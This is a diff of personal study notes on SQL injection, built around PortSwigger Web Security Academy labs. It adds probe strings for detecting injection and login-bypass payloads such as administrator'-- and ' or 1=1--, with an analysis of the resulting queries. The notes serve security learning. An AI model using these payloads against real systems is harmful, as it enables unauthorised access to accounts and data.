@@ -1,11 +1,27 @@
 https://www.youtube.com/watch?v=wX6tszfgYp4
 
+Portswigger SQLI:
 https://portswigger.net/web-security/sql-injection
-To test if sqli exists or not
+
+
+https://github.com/rkhal101/Web-Security-Academy-Series/tree/main/sql-injection
+
+![[Screenshot From 2024-12-25 14-01-07.png]]
+```
+
+to check SQLi on url
+'and 1=1--  (is True  and if dont throws error)
+'and 1=0--  (is false , and if throws error)  then SQLI is present.
+```
+
+```
+To test if sqli exists or not (in input fields like id and pw)
+
 1) use  ( ' ) as input and if it shows some error   , then
 2) use ( '-- ) if it shows  200 ok response that means SQLi is present
 because at ( ' ) the sql shows error due to syntax error, but at ( '-- ) the -- comments out the rest of the sql query being executed hence request dont show error.
 
+```
 
 # 1)Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data                                  video:https://portswigger.net/web-security/sql-injection/
  lab video: https://www.youtube.com/watch?v=X1X1UdaC_90
@@ -47,6 +63,24 @@ then use **'  or 1=1 --**  now it shows all product  means the query executed he
 
 # 2)Lab: SQL injection vulnerability allowing login bypass
 Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass
+Video : https://www.youtube.com/watch?v=ML3aGaloczI
+
+```
+SQL injection - Login functionality
+
+End Goal: perform SQLi attack and log in as the administrator user. 
+
+Analysis
+--------
+
+SELECT firstname FROM users where username='admin' and password='admin'
+
+SELECT firstname FROM users where username=''' and password='admin'
+
+SELECT firstname FROM users where username='administrator'--' and password='admin'
+
+SELECT firstname FROM users where username='admin'
+```
 
 
 request sent for exploiting the sqli:
@@ -77,8 +111,10 @@ https://0a9000f803024633818f758c0079008f.web-security-academy.net/my-account?id=
 
 SELECT firstname FROM products WHERE username= 'administrator'--' and password=' '
 
-
-
+example:
+![[Pasted image 20241225141302.png]]
+here 'test' is the wrong pw but ( ' or 1=1--' ) makes the statement of PW true, 
+therefore if sqli is present and username= admin then youll get login. 
 
 # 3)Retrieving data from other database tables i.e [https://portswigger.net/web-security/sql-injection/union-attacks]
 
